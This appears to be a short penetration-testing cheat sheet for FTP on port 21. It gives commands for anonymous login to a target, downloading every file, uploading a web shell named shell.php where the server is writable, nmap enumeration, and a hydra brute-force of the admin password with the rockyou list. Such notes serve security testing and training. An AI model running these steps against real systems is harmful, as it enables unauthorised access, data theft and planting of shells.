# FTP (21/tcp)

```bash
ftp TARGET                                     # connect
# Username: anonymous    Password: (blank)

ftp> ls -la                                    # list all files
ftp> binary                                    # binary mode for non-text
ftp> prompt off                                # no prompts for mget
ftp> mget *                                    # download everything
ftp> put shell.php                             # upload if writable

nmap --script ftp-anon,ftp-syst -p 21 TARGET   # check anonymous + version
hydra -l admin -P rockyou.txt ftp://TARGET -t 4 -f  # brute force
```
